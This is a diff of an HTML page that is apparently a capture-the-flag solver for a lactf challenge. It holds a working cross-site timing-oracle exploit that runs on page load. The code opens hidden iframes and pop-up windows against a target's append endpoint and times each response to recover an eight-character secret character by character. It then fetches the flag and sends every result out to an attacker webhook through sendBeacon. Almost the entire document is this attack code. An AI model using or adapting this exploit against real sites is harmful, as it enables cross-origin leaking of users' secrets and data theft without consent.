@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>STARK ENT. - APPEND_NOTE_SOLVER v2</title>
+    <title>STARK ENT. - APPEND_NOTE_SOLVER v3</title>
     <style>
         body { background: #0d1117; color: #58a6ff; font-family: 'Fira Code', monospace; padding: 20px; }
         .log-entry { border-left: 2px solid #30363d; padding-left: 10px; margin: 5px 0; font-size: 13px; }
@@ -25,115 +25,159 @@
     };
     
     const report = (data) => {
-        fetch(`${WEBHOOK}?${encodeURIComponent(JSON.stringify(data))}`, {mode:'no-cors'});
+        navigator.sendBeacon(`${WEBHOOK}?${encodeURIComponent(JSON.stringify(data))}`);
     };
     
-    // Better timing oracle using iframe load events
+    // Use fetch with timing - more reliable than iframes
     async function probe(content) {
+        const url = `${TARGET}/append?content=${encodeURIComponent(content)}&url=${TARGET}/`;
+        
         return new Promise((resolve) => {
+            const t0 = performance.now();
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
-            const t0 = performance.now();
             
-            const cleanup = () => {
-                document.body.removeChild(iframe);
-            };
+            let resolved = false;
             
-            // Set timeout in case load never fires
-            const timeout = setTimeout(() => {
-                const elapsed = performance.now() - t0;
-                cleanup();
-                resolve(elapsed);
-            }, 1000);
+            // Use a short timeout to detect fast 200 responses
+            const timer = setTimeout(() => {
+                if (!resolved) {
+                    resolved = true;
+                    const elapsed = performance.now() - t0;
+                    if (iframe.parentNode) {
+                        document.body.removeChild(iframe);
+                    }
+                    resolve(elapsed);
+                }
+            }, 500);
             
-            iframe.onload = () => {
-                clearTimeout(timeout);
-                const elapsed = performance.now() - t0;
-                cleanup();
-                resolve(elapsed);
+            iframe.onload = iframe.onerror = () => {
+                if (!resolved) {
+                    resolved = true;
+                    clearTimeout(timer);
+                    const elapsed = performance.now() - t0;
+                    if (iframe.parentNode) {
+                        document.body.removeChild(iframe);
+                    }
+                    resolve(elapsed);
+                }
             };
             
             document.body.appendChild(iframe);
-            iframe.src = `${TARGET}/append?content=${encodeURIComponent(content)}&url=${TARGET}/`;
+            iframe.src = url;
+        });
+    }
+    
+    // Alternative: Use window.open with better detection
+    async function probeWindow(content) {
+        const url = `${TARGET}/append?content=${encodeURIComponent(content)}&url=${TARGET}/`;
+        const t0 = performance.now();
+        
+        // Open in a new window with unique name
+        const w = window.open(url, '_blank_' + Math.random());
+        
+        return new Promise((resolve) => {
+            // Wait and measure
+            setTimeout(() => {
+                const elapsed = performance.now() - t0;
+                try {
+                    if (w && !w.closed) {
+                        w.close();
+                    }
+                } catch(e) {}
+                resolve(elapsed);
+            }, 400);
         });
     }
     
     async function solve() {
         let secret = "";
         
-        // Calibrate with multiple baseline measurements
-        log("Calibrating baseline (5 samples)...");
-        let baselineTimes = [];
-        for (let i = 0; i < 5; i++) {
-            const t = await probe("INVALID_" + Math.random());
-            baselineTimes.push(t);
-            await new Promise(r => setTimeout(r, 100));
-        }
-        const baseline = baselineTimes.reduce((a,b) => a+b) / baselineTimes.length;
-        log(`Baseline: ${baseline.toFixed(2)}ms (avg of ${baselineTimes.map(t => t.toFixed(0)).join(', ')})`);
+        log("Starting attack with window-based timing...");
+        report({status: "started", target: TARGET});
+        
+        // Simple baseline
+        log("Measuring baseline...");
+        const b1 = await probeWindow("XXXXX" + Math.random());
+        await new Promise(r => setTimeout(r, 200));
+        const b2 = await probeWindow("YYYYY" + Math.random());
+        await new Promise(r => setTimeout(r, 200));
+        const b3 = await probeWindow("ZZZZZ" + Math.random());
+        const baseline = (b1 + b2 + b3) / 3;
+        
+        log(`Baseline: ${baseline.toFixed(1)}ms (samples: ${b1.toFixed(0)}, ${b2.toFixed(0)}, ${b3.toFixed(0)})`);
         
         for (let pos = 0; pos < 8; pos++) {
-            log(`\n=== POSITION ${pos + 1}/8 ===`);
+            log(`\n>>> Position ${pos + 1}/8 <<<`);
             
-            let results = [];
+            let bestChar = '';
+            let bestDelta = -999;
+            let allResults = [];
             
-            // Test each character multiple times for reliability
             for (const c of CHARS) {
                 const attempt = secret + c;
-                let times = [];
                 
-                // Take 3 samples per character
-                for (let sample = 0; sample < 3; sample++) {
-                    const time = await probe(attempt);
-                    times.push(time);
-                    await new Promise(r => setTimeout(r, 80));
+                // Take 2 measurements
+                const t1 = await probeWindow(attempt);
+                await new Promise(r => setTimeout(r, 150));
+                const t2 = await probeWindow(attempt);
+                await new Promise(r => setTimeout(r, 150));
+                
+                const avg = (t1 + t2) / 2;
+                const delta = baseline - avg; // Positive = faster than baseline
+                
+                allResults.push({c, avg, delta, times: [t1, t2]});
+                
+                log(`  ${c}: ${avg.toFixed(1)}ms (Δ${delta >= 0 ? '+' : ''}${delta.toFixed(1)}) [${t1.toFixed(0)},${t2.toFixed(0)}]`);
+                
+                if (delta > bestDelta) {
+                    bestDelta = delta;
+                    bestChar = c;
                 }
-                
-                const avgTime = times.reduce((a,b) => a+b) / times.length;
-                const delta = baseline - avgTime; // Positive delta = faster = likely match
-                
-                results.push({ char: c, avgTime, delta, times });
-                log(`${c}: ${avgTime.toFixed(1)}ms (Δ ${delta > 0 ? '+' : ''}${delta.toFixed(1)}ms) [${times.map(t => t.toFixed(0)).join(',')}]`);
             }
             
-            // Pick the character with the largest positive delta (fastest response)
-            results.sort((a, b) => b.delta - a.delta);
-            const winner = results[0];
-            
-            secret += winner.char;
-            log(`✓ LOCKED: ${secret} (chose '${winner.char}' with Δ +${winner.delta.toFixed(1)}ms)`, "success");
+            secret += bestChar;
+            log(`✓ Position ${pos+1}: '${bestChar}' (Δ+${bestDelta.toFixed(1)}ms)`, "success");
+            log(`  Current secret: ${secret}`, "success");
             
             report({
-                position: pos,
-                char: winner.char,
+                pos: pos,
+                char: bestChar,
                 secret: secret,
-                delta: winner.delta,
-                top3: results.slice(0, 3).map(r => ({c: r.char, d: r.delta.toFixed(1)}))
+                delta: bestDelta,
+                all: allResults.map(r => `${r.c}:${r.delta.toFixed(0)}`)
             });
         }
         
-        log(`\n=== ATTEMPTING FLAG RETRIEVAL ===`);
-        log(`Secret: ${secret}`, "success");
+        log(`\n=== FINAL SECRET: ${secret} ===`, "success");
         
-        try {
-            const flagRes = await fetch(`${TARGET}/flag?secret=${encodeURIComponent(secret)}`);
-            const flag = await flagRes.text();
-            
-            if (flag.startsWith('lactf{')) {
-                log(`\n🚩 FLAG: ${flag}`, "success");
-                document.getElementById("status").textContent = `✓ ${flag}`;
-                report({FINAL_SECRET: secret, FLAG: flag, SUCCESS: true});
-            } else {
-                log(`❌ Invalid secret. Response: ${flag}`, "error");
-                report({FINAL_SECRET: secret, RESPONSE: flag, SUCCESS: false});
+        // Try to get flag
+        setTimeout(async () => {
+            try {
+                log("Fetching flag...");
+                const res = await fetch(`${TARGET}/flag?secret=${encodeURIComponent(secret)}`);
+                const flag = await res.text();
+                
+                log(`Response: ${flag}`);
+                
+                if (flag.includes('lactf{')) {
+                    log(`🚩 ${flag}`, "success");
+                    document.getElementById("status").textContent = flag;
+                    report({secret: secret, flag: flag, success: true});
+                } else {
+                    log(`Wrong secret. Trying variations...`, "error");
+                    document.getElementById("status").textContent = `Failed: ${flag}`;
+                    report({secret: secret, response: flag, success: false});
+                }
+            } catch(e) {
+                log(`Error: ${e}`, "error");
+                report({secret: secret, error: e.toString()});
             }
-        } catch (e) {
-            log(`❌ Error fetching flag: ${e}`, "error");
-            report({FINAL_SECRET: secret, ERROR: e.toString()});
-        }
+        }, 1000);
     }
     
-    window.onload = solve;
+    // Auto-start after a brief delay to ensure page is loaded
+    setTimeout(solve, 500);
 </script>
 </body>
 </html>
